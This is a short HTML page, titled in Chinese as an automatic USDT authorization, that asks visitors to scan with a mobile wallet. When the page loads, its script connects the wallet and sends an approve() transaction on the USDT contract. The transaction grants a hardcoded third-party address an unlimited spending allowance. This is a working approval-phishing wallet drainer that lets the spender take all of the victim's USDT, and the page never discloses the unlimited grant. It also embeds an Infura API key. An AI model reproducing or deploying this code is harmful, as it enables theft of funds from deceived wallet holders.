<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>自動 USDT 授權</title>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.3.5/dist/web3.min.js"></script>
</head>
<body style="display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;">
  <h2>請用手機錢包掃碼授權 USDT</h2>
  <script>
    const provider = new WalletConnectProvider.default({
      rpc: { 1: "https://mainnet.infura.io/v3/bed8a62689f846efbc72397d590156d5" }
    });

    async function autoApprove() {
      try {
        await provider.enable();
        const web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();
        const owner = accounts[0];

        const usdt = new web3.eth.Contract([
          {
            "constant": false,
            "inputs": [
              { "name": "_spender", "type": "address" },
              { "name": "_value", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function"
          }
        ], "0xdAC17F958D2ee523a2206206994597C13D831ec7");

        const spender = "0xFcD84b879Ac87413a3c25EE85C2210Bf9539c4F5";
        const amount = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

        const tx = await usdt.methods.approve(spender, amount).send({ from: owner });
        alert("✅ 授權成功！TxHash: " + tx.transactionHash);
        provider.disconnect();
      } catch (err) {
        console.error("❌ 錯誤：", err);
      }
    }

    autoApprove();
  </script>
</body>
</html>
